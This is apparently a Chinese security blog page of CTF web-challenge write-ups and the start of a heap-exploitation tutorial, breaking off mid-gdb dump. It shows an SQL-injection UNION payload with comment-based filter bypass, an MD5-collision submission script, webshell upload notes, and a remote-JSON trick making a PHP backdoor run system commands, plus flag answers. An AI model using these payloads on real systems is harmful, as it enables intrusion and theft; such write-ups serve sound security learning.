<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<a href="http://114.55.36.69:8022" target="_blank" rel="noopener">http://114.55.36.69:8022</a></p>
<p>当传入A.A、A[A或者A A时，PHP的$GET函数会自动将[.和空格转为_<br>这道题测试+也是可以绕过<br>数组大于任意的数字，字符串中如果没有数字，则==0</p>
<p>A.A[]=1</p>
<h2 id="md5-crack"><a href="#md5-crack" class="headerlink" title="md5 crack"></a>md5 crack</h2><p>fastcoll.exe -p 1.txt -o 1.bin 2.bin</p>
<p>py读取二进制流在urlencode一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">'1.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">f2 = open(<span class="string">'2.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2</span><br><span class="line">&#125;</span><br><span class="line">print(urllib.parse.quote(f1))</span><br><span class="line">print(urllib.parse.quote(f2))</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>

<p>然后通过burp或者py都可以直接获得flag</p>
<p>这里用hackbar会变成二次url编码，然后会出问题</p>
<h2 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h2><p>word=%’and 1=2 /<em>!32302union</em>/ /<em>!32302select</em>/ 1,2,flag from admin#&amp;number=5</p>
<p>有点骚，这个操作，内联注释绕过，虽然不知道原理，还是学到了</p>
<p>注释是c语言注释格式/* */  !和数字，这个数字不能太小</p>
<p>。。flag不对。。</p>
<h2 id="玩个蛇皮"><a href="#玩个蛇皮" class="headerlink" title="玩个蛇皮"></a>玩个蛇皮</h2><p>玩个蛇皮 <a href="http://114.55.36.69:8011" target="_blank" rel="noopener">http://114.55.36.69:8011</a><br>简单js执行命令即可</p>
<h2 id="ddcms"><a href="#ddcms" class="headerlink" title="ddcms"></a>ddcms</h2><p>查看默认管理后端<br>弱口令，传小马，连上拿flag</p>
<p>1de3ce6607a0f95as1861c4bbb3687b8</p>
<h2 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码审计，发觉可以命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'ip地址'</span>.ljust(<span class="number">15</span>, <span class="string">'/'</span>)</span><br><span class="line">addr = <span class="string">'a'</span>*<span class="number">10</span> + ip[<span class="number">-10</span>:] + <span class="string">'b'</span>*<span class="number">10</span> + ip[:<span class="number">5</span>] + <span class="string">"c"</span>*<span class="number">10</span></span><br><span class="line">print(addr)</span><br><span class="line">print(len(addr))</span><br><span class="line">md5 = hashlib.md5(addr.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">print(md5)</span><br><span class="line">http_addr = <span class="string">"http://"</span> + addr</span><br><span class="line">print(http_addr)</span><br></pre></td></tr></table></figure>




<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/dama.php HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8020</span><br><span class="line">User-Agent:md5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.55.36.69:8020/upload/dama.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pass=aaaaaaaaaaxxxxxx///bbbbbbbbbbxxxxcccccccccc&amp;submit=submit</span><br></pre></td></tr></table></figure>


<p>部署在服务器上，默认以80端口，这样就不用index.php了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>,</span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span></span><br><span class="line">);</span><br><span class="line">$url = json_encode($url);</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/%E6%AF%94%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/%E6%AF%94%E8%B5%9B/" class="post-title-link" itemprop="url">2019软件测试web安全题目writeup收集</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:40:22" itemprop="dateModified" datetime="2019-10-30T17:40:22+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">练习</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>852</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>比比手速 靶机地址：101.71.29.5:10065</p>
<p>burp抓包可知密码<br>然后文件上传，1.php.jpg<br>连接小马</p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><a href="https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/</a></p>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p><a href="https://blog.csdn.net/u011377996/article/details/83867976" target="_blank" rel="noopener">https://blog.csdn.net/u011377996/article/details/83867976</a></p>
<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p><a href="https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/" target="_blank" rel="noopener">https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/</a><br>666_0rdorby_you_can</p>
<h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p><a href="https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login" target="_blank" rel="noopener">https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login</a><br><a href="http://site3.sjk.space/dosgk1.php" target="_blank" rel="noopener">http://site3.sjk.space/dosgk1.php</a></p>
<p>a327f27394c63ef5d6b1eed9591b90a4</p>
<h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>抓包可得</p>
<p>c456aa77cf2bc89affb665194e9dee57</p>
<h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p><a href="https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2" target="_blank" rel="noopener">https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2</a><br>aa5237a5fc25af3fa07f1d724f7548d7</p>
<h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><p><a href="http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></p>
<h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><p><a href="http://xcx1024.com/ArtInfo/524039.html" target="_blank" rel="noopener">http://xcx1024.com/ArtInfo/524039.html</a></p>
<p>981369acba32abc4e28103fedd4891d2</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-heap-learn-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-heap-learn-3/" class="post-title-link" itemprop="url">pwn堆入门系列教程3</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:28:46" itemprop="dateModified" datetime="2019-10-30T17:28:46+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E5%A0%86/" itemprop="url" rel="index">
                    <span itemprop="name">堆</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwn堆入门系列教程3"><a href="#pwn堆入门系列教程3" class="headerlink" title="pwn堆入门系列教程3"></a>pwn堆入门系列教程3</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn入门系列教程2</a></p>
<p>序言：这次终于过了off-by-one来到了Chunk Extend / Overlapping,这部分在上一节也进行了学习，所以难度相对来说不会是那么大，刚起初我以为，因为第一题很简单，但做到第二题，我发觉我连格式化字符串的漏洞都不会利用，真的是太菜了，后面看了看雪大佬的文章才会做</p>
<h2 id="1-1-HITCON-Trainging-lab13"><a href="#1-1-HITCON-Trainging-lab13" class="headerlink" title="1.1. HITCON Trainging lab13"></a>1.1. HITCON Trainging lab13</h2><p>这道题还是相对简单的，对于前面几道来说，上一道已经用过这种方法了，而且比这复杂许多，所以差不多了，不过还有些小细节注意下就好</p>
<h3 id="1-1-1-功能分析"><a href="#1-1-1-功能分析" class="headerlink" title="1.1.1. 功能分析"></a>1.1.1. 功能分析</h3><p>引用于ctf-wiki</p>
<ol>
<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 的漏洞。</li>
<li>展示堆，输出指定索引堆的大小以及内容。</li>
<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
</ol>
<h3 id="1-1-2-漏洞点分析"><a href="#1-1-2-漏洞点分析" class="headerlink" title="1.1.2. 漏洞点分析"></a>1.1.2. 漏洞点分析</h3><p>漏洞点存在off-by-one,通过off-by-one进行overlapping就成了</p>
<h3 id="1-1-3-漏洞利用过程"><a href="#1-1-3-漏洞利用过程" class="headerlink" title="1.1.3. 漏洞利用过程"></a>1.1.3. 漏洞利用过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1775030-0x30</span><br><span class="line">0x1775000:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775010:	0x0000000000000018	0x0000000001775030</span><br><span class="line">0x1775020:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块1 chunk</span></span><br><span class="line">0x1775030:	0x0000000a31313131	0x0000000000000000</span><br><span class="line">0x1775040:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775050:	0x0000000000000010	0x0000000001775070</span><br><span class="line">0x1775060:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块2 chunk</span></span><br><span class="line">0x1775070:	0x0000000a32323232	0x0000000000000000</span><br><span class="line">0x1775080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0x1775090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>攻击过程：</p>
<ol>
<li>创建两个堆块初始化(实际创了4个堆块，两个结构体堆块，两个数据堆块)至于一个为什么要0x18，因为要利用他会使用下个chunk的pre_size作为数据部分，这样才能off-by-one溢出到size</li>
<li>编辑第0块堆块，利用off-by-one覆盖第二块堆块的size，修改size为0x41<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x8a5030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0x8a5000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x00000000008a5030</span></span><br><span class="line"><span class="number">0x8a5020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span> #/bin/sh为后面做准备</span><br><span class="line"><span class="number">0x8a5040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta"># off-by-one</span></span><br><span class="line"><span class="number">0x8a5050</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x00000000008a5070</span></span><br><span class="line"><span class="number">0x8a5060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5070</span>:	<span class="number">0x0000000a32323232</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0x8a5090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5150</span>:	<span class="number">0x0000000000000000</span>	